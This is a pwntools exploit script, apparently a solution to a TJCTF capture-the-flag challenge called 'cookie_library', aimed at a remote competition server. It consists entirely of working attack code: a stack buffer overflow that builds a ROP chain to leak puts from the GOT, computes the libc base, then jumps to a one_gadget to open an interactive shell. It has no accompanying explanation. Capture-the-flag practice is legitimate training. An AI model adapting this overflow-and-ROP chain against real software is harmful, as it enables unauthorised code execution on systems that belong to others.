from pwn import *

def exploit():
    # p = process("./cookie_library")
    p = remote("p1.tjctf.org", 8010)
    binary = ELF("cookie_library")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    got_puts = binary.got['puts']
    plt_puts = binary.plt['puts']
    pop_rdi = 0x0000000000400933
    main = binary.symbols['main']
    ret = 0x000000000040061e

    payload = ''
    payload += 'A' * 0x58
    payload += p64(pop_rdi)
    payload += p64(got_puts)
    payload += p64(plt_puts)
    payload += p64(main)

    p.sendline(payload)

    p.recvuntil("anymore\n")
    libc_leak = u64(p.recvline().ljust(8, '\x00'))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc.address = libc_leak - 0x0809c0
    log.info("Libc base : {}".format(hex(libc.address)))
    libc_system = libc.symbols['system']
    log.info("Libc system : {}".format(libc_system))
    libc_binsh = libc.search("/bin/sh").next()
    log.info("Libc /bin/sh : {}".format(libc_binsh))
    one_gadget = libc.address + 0x10a38c
    log.info("One gadget : {}".format(hex(one_gadget)))

    payload = ''
    payload += 'A' * 0x58
    payload += p64(one_gadget)

    # gdb.attach(p)
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()